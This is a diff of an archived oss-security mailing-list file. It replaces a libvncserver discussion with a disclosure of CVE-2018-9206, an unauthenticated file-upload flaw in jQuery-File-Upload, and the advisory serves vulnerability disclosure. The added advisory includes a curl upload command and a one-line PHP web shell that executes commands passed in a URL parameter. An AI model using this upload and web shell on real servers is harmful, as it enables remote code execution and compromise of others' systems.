@@ -1,33 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/12/13/6
-Message-ID: <20181213103929.GA16401@openwall.com>
-Date: Thu, 13 Dec 2018 11:39:29 +0100
-From: Solar Designer <solar@...nwall.com>
-To: Pavel Cheremushkin <Pavel.Cheremushkin@...persky.com>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: libvnc and tightvnc vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/10/14/1
+Message-id: <270DF5EF-8FE1-486A-B15B-BC117769E4D8@me.com>
+Date: Sat, 13 Oct 2018 22:11:41 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Security <oss-security@...ts.openwall.com>
+Subject: Re: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On Mon, Dec 10, 2018 at 07:57:21PM +0100, Solar Designer wrote:
-> https://github.com/LibVNC/libvncserver/issues/247
-> 
-> Upstream's fix appears to be to add casts to (uint64_t) before adding 1
-> in those many malloc() calls.  On platforms with larger than 32-bit
-> size_t, this should be sufficient against integer overflows since the
-> sizes are read from 32-bit protocol fields, but it isn't sufficient to
-> prevent maliciously large memory allocation on the client by a rogue
-> server.  On a platform with 32-bit size_t, this isn't even sufficient to
-> prevent the integer overflows.  If I haven't missed anything, it'd be
-> great if you open a new issue suggesting introduction of safety limits
-> prior to those malloc() lines.
+Hello All,
 
-> [...] per the commits referenced in issue #247 above, there are many more
-> instances of the "malloc(... + 1)" pattern, which were patched similarly
-> incompletely.
+ 
 
-I've just created this issue:
+This has been fixed in v9.22.1.
 
-SECURITY: malloc((uint64_t)length + 1) is unsafe, especially on 32-bit systems
-https://github.com/LibVNC/libvncserver/issues/273
+ 
 
-Alexander
+Larry
+
+From: "Larry W. Cashdollar" <larry0@...com>
+Reply-To: Open Security <oss-security@...ts.openwall.com>
+Date: Thursday, October 11, 2018 at 12:07 PM
+To: Open Security <oss-security@...ts.openwall.com>
+Subject: [oss-security] jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
+
+ 
+
+Title: jQuery-File-Upload <= v9.22.0 unauthenticated arbitrary file upload vulnerability
+Author: Larry W. Cashdollar, @_larry0
+Date: 2018-10-09
+CVE-ID:[CVE-2018-9206]
+Download Site: https://github.com/blueimp/jQuery-File-Upload/
+Vendor: https://github.com/blueimp
+Vendor Notified: 2018-10-09
+Vendor Contact:
+Advisory: http://www.vapidlabs.com/advisory.php?v=204
+Description: File Upload widget with multiple file selection, drag&drop support, progress bar, validation and preview images, audio and video for jQuery. Supports cross-domain, chunked and resumable file uploads. Works with any server-side platform (Google App Engine, PHP, Python, Ruby on Rails, Java, etc.) that supports standard HTML form file uploads.
+Vulnerability:
+The code in https://github.com/blueimp/jQuery-File-Upload/blob/master/server/php/UploadHandler.php doesn't require any validation to upload files to the server. It also doesn't exclude file types. This allows for remote code execution.
+
+
+Exploit Code:
+$ curl -F "files=@...ll.php" http://localhost/jQuery-File-Upload-9.22.0/server/php/index.php
+
+Where shell.php is:
+
+<?php 
+
+$cmd=$_GET['cmd']; 
+
+system($cmd);
+
+?>
+Screen Shots:
+Notes: Actively being exploited in the wild. https://github.com/blueimp/jQuery-File-Upload/pull/3514
+
+
